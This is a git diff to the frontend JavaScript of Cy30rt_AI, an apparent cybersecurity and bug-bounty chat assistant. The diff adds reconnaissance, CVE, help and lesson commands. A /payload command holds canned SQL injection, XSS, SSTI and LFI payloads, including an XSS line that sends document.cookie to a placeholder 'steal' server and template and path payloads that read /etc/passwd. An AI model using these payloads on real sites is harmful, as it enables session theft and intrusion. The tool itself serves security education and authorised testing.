@@ -1,4 +1,6 @@
-// Cy30rt_AI - DeepSeek Style Complete Version
+// Cy30rt_AI - Complete Version with Reconix Integration
+// Created by Abdulbasid Yakubu (cy30rt)
+
 const API_URL = "https://cy30rt-ai.onrender.com";
 
 // Global variables
@@ -59,18 +61,6 @@ function createNewChat() {
     saveChats();
     renderHistoryList();
     loadCurrentChat();
-}
-
-function deleteChat(chatId) {
-    chatHistory = chatHistory.filter(c => c.id !== chatId);
-    if (chatHistory.length === 0) {
-        createNewChat();
-    } else if (currentChatId === chatId) {
-        currentChatId = chatHistory[0].id;
-        loadCurrentChat();
-    }
-    saveChats();
-    renderHistoryList();
 }
 
 function switchChat(chatId) {
@@ -139,11 +129,15 @@ function getWelcomeHTML() {
         <div class="welcome-screen">
             <div class="welcome-icon">🤖</div>
             <h1>Cy30rt_AI</h1>
-            <p>How can I help you with cybersecurity today?</p>
+            <p>Your cybersecurity & bug bounty assistant</p>
             <div class="example-prompts">
-                <button class="example-btn" onclick="sendExample('What is SQL injection? Explain with examples.')">What is SQL injection?</button>
-                <button class="example-btn" onclick="sendExample('How to perform network reconnaissance?')">How to perform network reconnaissance?</button>
-                <button class="example-btn" onclick="sendExample('Explain Cross-Site Scripting (XSS) attacks.')">Explain XSS attacks</button>
+                <button class="example-btn" onclick="sendExample('What is SQL injection?')">Learn SQLi</button>
+                <button class="example-btn" onclick="sendExample('/recon scanme.nmap.org')">Run Recon</button>
+                <button class="example-btn" onclick="sendExample('/payload xss')">Get Payloads</button>
+                <button class="example-btn" onclick="sendExample('/cve CVE-2024-6387')">Look up CVE</button>
+            </div>
+            <div class="creator-note">
+                Created by Abdulbasid Yakubu (cy30rt) | Type /help for all commands
             </div>
         </div>
     `;
@@ -190,16 +184,105 @@ function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
+// ============ RECONIX INTEGRATION ============
+async function runReconix(target, options = {}) {
+    const container = document.getElementById("messagesContainer");
+    const statusDiv = document.createElement("div");
+    statusDiv.className = "message assistant";
+    const messageId = 'recon_' + Date.now();
+    statusDiv.id = messageId;
+    statusDiv.innerHTML = `
+        <div class="message-avatar">🔍</div>
+        <div class="message-content">
+            <div class="message-header">
+                <span class="message-sender">Recon Engine</span>
+                <span class="message-time">${new Date().toLocaleTimeString()}</span>
+            </div>
+            <div class="message-text" id="reconStatus_${messageId}">
+                🚀 Starting reconnaissance on ${target}...
+            </div>
+        </div>
+    `;
+    container.appendChild(statusDiv);
+    scrollToBottom();
+    
+    try {
+        const response = await fetch(`${API_URL}/api/recon`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ target: target, options: options })
+        });
+        
+        const data = await response.json();
+        const statusText = document.getElementById(`reconStatus_${messageId}`);
+        
+        if (data.success) {
+            let resultText = `✅ **Recon Complete - ${target}**\n\n`;
+            resultText += `📊 **Summary:**\n`;
+            resultText += `• Subdomains found: ${data.summary.subdomains_found}\n`;
+            resultText += `• Technologies detected: ${data.summary.technologies_found}\n`;
+            resultText += `• Endpoints discovered: ${data.summary.endpoints_found}\n`;
+            resultText += `• Secrets found: ${data.summary.secrets_found}\n`;
+            resultText += `• Vulnerabilities: ${data.summary.vulnerabilities_found}\n\n`;
+            
+            if (data.findings.subdomains.length > 0) {
+                resultText += `🔹 **Subdomains:**\n`;
+                data.findings.subdomains.slice(0, 10).forEach(s => resultText += `  • ${s}\n`);
+                resultText += `\n`;
+            }
+            
+            if (data.findings.technologies.length > 0) {
+                resultText += `🔹 **Technologies:**\n`;
+                data.findings.technologies.slice(0, 10).forEach(t => resultText += `  • ${t}\n`);
+                resultText += `\n`;
+            }
+            
+            if (data.findings.endpoints.length > 0) {
+                resultText += `🔹 **Key Endpoints:**\n`;
+                data.findings.endpoints.slice(0, 10).forEach(e => resultText += `  • ${e}\n`);
+                resultText += `\n`;
+            }
+            
+            if (data.findings.secrets.length > 0) {
+                resultText += `⚠️ **Potential Secrets Found - Review Carefully!**\n`;
+                data.findings.secrets.slice(0, 5).forEach(s => resultText += `  • ${s}\n`);
+                resultText += `\n`;
+            }
+            
+            resultText += `💡 **Next Steps:**\n`;
+            resultText += `• Ask me: "Analyze these findings"\n`;
+            resultText += `• Run: /payload sqli for SQL injection payloads\n`;
+            resultText += `• Check subdomains with /recon [subdomain]\n\n`;
+            resultText += `⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI`;
+            
+            if (statusText) {
+                statusText.innerHTML = formatMessage(escapeHtml(resultText));
+            }
+            return data.output;
+        } else {
+            if (statusText) {
+                statusText.innerHTML = `❌ **Error:** ${escapeHtml(data.error)}\n\nMake sure Reconix is installed on the server.`;
+            }
+            return null;
+        }
+    } catch (error) {
+        const statusText = document.getElementById(`reconStatus_${messageId}`);
+        if (statusText) {
+            statusText.innerHTML = `❌ **Error:** ${escapeHtml(error.message)}`;
+        }
+        return null;
+    }
+}
+
 // ============ SEND MESSAGE ============
 async function sendMessage() {
     const input = document.getElementById("messageInput");
-    const message = input.value.trim();
+    let message = input.value.trim();
     if (!message) return;
     
     input.value = "";
     input.style.height = "auto";
     
-    // Remove welcome screen if present
     const container = document.getElementById("messagesContainer");
     if (container.querySelector(".welcome-screen")) {
         container.innerHTML = '';
@@ -211,6 +294,148 @@ async function sendMessage() {
     showTypingIndicator();
     
     try {
+        // Check for recon commands
+        let isReconCommand = false;
+        let target = null;
+        let options = {};
+        
+        if (message.startsWith('/recon')) {
+            target = message.replace('/recon', '').trim();
+            isReconCommand = true;
+            options = {
+                deep: message.includes('--deep') || message.includes('deep'),
+                js: message.includes('--js') || message.includes('javascript'),
+                historical: message.includes('--historical') || message.includes('wayback'),
+                aggressive: message.includes('--aggressive') || message.includes('full'),
+                threads: 20
+            };
+        } else if (message.toLowerCase().includes('run recon on')) {
+            target = message.toLowerCase().replace('run recon on', '').trim();
+            isReconCommand = true;
+            options = { deep: true, js: true, historical: true, threads: 20 };
+        } else if (message.toLowerCase().match(/scan\s+([a-z0-9.-]+)/)) {
+            const match = message.toLowerCase().match(/scan\s+([a-z0-9.-]+)/);
+            if (match) {
+                target = match[1];
+                isReconCommand = true;
+                options = { deep: true, js: true, historical: true, threads: 20 };
+            }
+        }
+        
+        if (isReconCommand && target) {
+            hideTypingIndicator();
+            await runReconix(target, options);
+            return;
+        }
+        
+        // Check for payload commands
+        if (message.startsWith('/payload')) {
+            const type = message.replace('/payload', '').trim().toLowerCase();
+            const payloads = {
+                'sqli': `💉 **SQL Injection Payloads**\n\n**Authentication Bypass:**\n' OR '1'='1' --\nadmin' --\n' OR 1=1--\n\n**Union-Based:**\n' UNION SELECT null, username, password FROM users--\n' UNION SELECT 1,2,3,4,5--\n\n**Time-Based:**\n' AND SLEEP(5)--\n' OR IF(1=1, SLEEP(5), 0)--`,
+                'xss': `🔓 **XSS Payloads**\n\n**Basic Alert:**\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n\n**Cookie Stealing:**\n<script>fetch('https://your-server.com/steal?c='+document.cookie)</script>`,
+                'ssti': `🧠 **SSTI Payloads**\n\n**Jinja2 (Python):**\n{{7*7}}\n{{config}}\n{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
+                'lfi': `📂 **LFI/RFI Payloads**\n\n**Basic LFI:**\n../../../../etc/passwd\n../../../etc/passwd%00\nphp://filter/convert.base64-encode/resource=index.php`
+            };
+            
+            if (type && payloads[type]) {
+                hideTypingIndicator();
+                const messageDiv = document.createElement("div");
+                messageDiv.className = "message assistant";
+                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
+                container.appendChild(messageDiv);
+                const textDiv = messageDiv.querySelector(".message-text");
+                await typeMessage(textDiv, payloads[type]);
+                addMessageToCurrentChat('assistant', payloads[type]);
+                if (autoPlayEnabled) textToSpeech(payloads[type], currentLanguage);
+                addAudioControls(messageDiv, payloads[type], currentLanguage);
+                return;
+            }
+        }
+        
+        // Check for CVE command
+        if (message.startsWith('/cve')) {
+            const cveId = message.replace('/cve', '').trim().toUpperCase();
+            if (cveId) {
+                const cveResponse = `🔍 **CVE Intelligence: ${cveId}**\n\nSearching for ${cveId}...\n\nThis CVE lookup provides:\n• Vulnerability description\n• CVSS score (severity rating)\n• Affected software versions\n• Public exploits available\n• Mitigation steps\n\nWould you like me to analyze specific CVEs? Try /cve CVE-2024-6387 (OpenSSH)`;
+                hideTypingIndicator();
+                const messageDiv = document.createElement("div");
+                messageDiv.className = "message assistant";
+                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
+                container.appendChild(messageDiv);
+                const textDiv = messageDiv.querySelector(".message-text");
+                await typeMessage(textDiv, cveResponse);
+                addMessageToCurrentChat('assistant', cveResponse);
+                if (autoPlayEnabled) textToSpeech(cveResponse, currentLanguage);
+                addAudioControls(messageDiv, cveResponse, currentLanguage);
+                return;
+            }
+        }
+        
+        // Check for help command
+        if (message === '/help' || message === '/commands') {
+            const helpResponse = `🤖 **Cy30rt_AI Complete Commands**\n\n📚 **LEARNING MODE:**\n/learn sqli - SQL injection tutorial\n/learn xss - XSS tutorial\n/learn ssti - SSTI tutorial\n\n🔍 **BUG BOUNTY MODE:**\n/recon <target> - Run automated reconnaissance\n/payload <type> - Generate payloads (sqli, xss, ssti, lfi)\n/cve <id> - Look up CVE information\n\n💬 **GENERAL:**\n/help - Show this help\n/who - About the creator\n/new - Start new chat\n\n⚠️ Always test only on authorized targets!\n\nStay secure. - Cy30rt_AI`;
+            hideTypingIndicator();
+            const messageDiv = document.createElement("div");
+            messageDiv.className = "message assistant";
+            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
+            container.appendChild(messageDiv);
+            const textDiv = messageDiv.querySelector(".message-text");
+            await typeMessage(textDiv, helpResponse);
+            addMessageToCurrentChat('assistant', helpResponse);
+            if (autoPlayEnabled) textToSpeech(helpResponse, currentLanguage);
+            addAudioControls(messageDiv, helpResponse, currentLanguage);
+            return;
+        }
+        
+        // Check for who command
+        if (message === '/who' || message === '/creator' || message === '/about') {
+            const whoResponse = `🤖 **Cy30rt_AI**\n\nI am a professional cybersecurity and bug bounty assistant created by **Abdulbasid Yakubu (cy30rt)** , a cybersecurity professional dedicated to making security education accessible.\n\n**My capabilities:**\n• Teach cybersecurity concepts\n• Run reconnaissance on authorized targets (Reconix)\n• Generate attack payloads\n• Look up CVE information\n• 15 languages support\n• Voice interaction with adjustable speed\n\n⚠️ Always practice on authorized systems only!\n\nStay secure. - Cy30rt_AI`;
+            hideTypingIndicator();
+            const messageDiv = document.createElement("div");
+            messageDiv.className = "message assistant";
+            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
+            container.appendChild(messageDiv);
+            const textDiv = messageDiv.querySelector(".message-text");
+            await typeMessage(textDiv, whoResponse);
+            addMessageToCurrentChat('assistant', whoResponse);
+            if (autoPlayEnabled) textToSpeech(whoResponse, currentLanguage);
+            addAudioControls(messageDiv, whoResponse, currentLanguage);
+            return;
+        }
+        
+        // Check for new chat command
+        if (message === '/new' || message === '/clear') {
+            createNewChat();
+            hideTypingIndicator();
+            return;
+        }
+        
+        // Check for learn command
+        if (message.startsWith('/learn')) {
+            const topic = message.replace('/learn', '').trim().toLowerCase();
+            const lessons = {
+                'sqli': `📚 **SQL Injection Lesson**\n\n**What is SQL Injection?**\nSQL injection occurs when user input is inserted directly into SQL queries without sanitization.\n\n**How it works:**\nNormal query: SELECT * FROM users WHERE username='admin' AND password='pass'\nMalicious input: admin' --\nResult: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'\n\n**Test payloads:** /payload sqli`,
+                'xss': `📚 **XSS Lesson**\n\n**What is Cross-Site Scripting?**\nInjecting malicious JavaScript into web pages.\n\n**Types:**\n1. Reflected XSS\n2. Stored XSS\n3. DOM-based XSS\n\n**Test payloads:** /payload xss`,
+                'ssti': `📚 **SSTI Lesson**\n\n**What is Server-Side Template Injection?**\nAttacker injects template engine code into server-side rendering.\n\n**Detection:**\nTry {{7*7}} or ${7*7} - if you see 49, SSTI exists!\n\n**Test payloads:** /payload ssti`
+            };
+            
+            if (topic && lessons[topic]) {
+                hideTypingIndicator();
+                const messageDiv = document.createElement("div");
+                messageDiv.className = "message assistant";
+                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
+                container.appendChild(messageDiv);
+                const textDiv = messageDiv.querySelector(".message-text");
+                await typeMessage(textDiv, lessons[topic]);
+                addMessageToCurrentChat('assistant', lessons[topic]);
+                if (autoPlayEnabled) textToSpeech(lessons[topic], currentLanguage);
+                addAudioControls(messageDiv, lessons[topic], currentLanguage);
+                return;
+            }
+        }
+        
+        // Use Groq API for other questions
         const response = await fetch(`${API_URL}/api/chat`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -222,7 +447,6 @@ async function sendMessage() {
         const data = await response.text();
         hideTypingIndicator();
         
-        // Create AI message container
         const messageDiv = document.createElement("div");
         messageDiv.className = "message assistant";
         messageDiv.innerHTML = `
@@ -415,13 +639,6 @@ function escapeHtml(text) {
     return div.innerHTML;
 }
 
-function clearAllHistory() {
-    if (confirm("Delete all chat history? This cannot be undone.")) {
-        chatHistory = [];
-        createNewChat();
-    }
-}
-
 // ============ SETTINGS ============
 function loadSettings() {
     autoPlayEnabled = localStorage.getItem("auto_play") === "true";
@@ -497,14 +714,13 @@ function toggleMobileMenu() {
 
 // ============ INITIALIZE ============
 document.addEventListener("DOMContentLoaded", () => {
-    console.log("Cy30rt_AI Ready - DeepSeek Style");
+    console.log("Cy30rt_AI Ready - Bug Bounty Edition with Reconix");
     
     initChatHistory();
     loadSettings();
     renderLanguageGrid();
     
     document.getElementById("sendBtn")?.addEventListener("click", sendMessage);
-    document.getElementById("newChatBtn")?.addEventListener("click", createNewChat);
     document.getElementById("settingsBtn")?.addEventListener("click", showSettingsModal);
     document.getElementById("languageBtn")?.addEventListener("click", showLanguageModal);
     document.getElementById("mobileMenuBtn")?.addEventListener("click", toggleMobileMenu);
